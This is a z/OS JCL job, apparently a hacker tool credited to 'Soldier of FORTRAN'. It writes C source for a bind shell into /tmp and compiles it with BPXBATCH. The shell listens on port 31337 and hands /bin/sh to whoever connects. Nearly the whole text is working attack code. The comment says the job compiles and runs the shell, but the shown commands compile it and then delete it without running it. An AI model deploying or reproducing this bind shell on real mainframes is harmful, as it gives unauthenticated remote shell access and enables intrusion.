//<USERID>06 JOB (JOB),'Bind C Shell',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
//* JCL To create a C shell and bind to port 31337 
//* Creates files in /tmp and deletes them when you exit
//* by Soldier of FORTRAN
//CREATECS  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/uss_bind.c'
//SYSUT1    DD DATA,DLM=##
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
 int result , sockfd;
 int port;
 struct sockaddr_in sin;
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr = 0;
 sin.sin_port = htons(31337);
 bind (sockfd,(struct sockaddr *)&sin,sizeof(sin));
 listen(sockfd,5);
 result = accept (sockfd,NULL,0);
 dup2(result,2);
 dup2(result,1);
 dup2(result,0);
 printf("Creating Bind Shell on port 31337\n");
 execl("/bin/sh","sh",NULL);
return EXIT_SUCCESS;
}
##
//OMGLOL    EXEC PGM=BPXBATCH,REGION=800M
//* Now that the file is copied we compile and run it
//*STDOUT    DD PATH='/tmp/mystd.out',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//*STDERR    DD PATH='/tmp/mystd.err',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//STDPARM   DD *
SH cd /tmp;
cc -o /tmp/sh3ll /tmp/uss_bind.c;
rm /tmp/uss_bind.c;
rm /tmp/sh3ll;
/*
